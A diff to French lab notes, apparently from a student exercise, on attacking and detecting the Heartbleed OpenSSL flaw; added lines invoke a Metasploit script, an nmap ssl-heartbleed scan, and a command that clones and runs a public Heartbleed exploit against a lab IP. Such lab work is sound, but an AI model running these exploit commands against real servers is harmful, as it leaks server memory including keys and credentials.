@@ -136,7 +136,9 @@ openssl s_client -connect $ip:44330 -tlsextdebug | grep "TLS server extension"
 
 #### attaque :
 - attaque via metasploit msfconsole
+../bash/msf/metasploit_heartbleed.sh
 - usage de nmap avec le module ssl-heartbleed
+etudiant@debian-buster:~/heartbleed-example$ sudo nmap -p 443 --script ssl-heartbleed 192.168.1.173
 
 
 
@@ -161,3 +163,14 @@ openssl s_client -connect $ip:44330 -tlsextdebug | grep "TLS server extension"
     `sudo snort -T -i eth0 -c /etc/snort/snort.conf`
     - Now, let’s start Snort in IDS mode and tell it to display alerts to the console:
     `sudo snort -A console -q -c /etc/snort/snort.conf -i eth0` -->
+
+
+
+
+
+======================
+pentester :
+git clone https://github.com/mpgn/heartbleed-PoC.git && cd heartbleed-PoC && python heartbleed-exploit.py 192.168.1.173
+
+
+cat out.txt
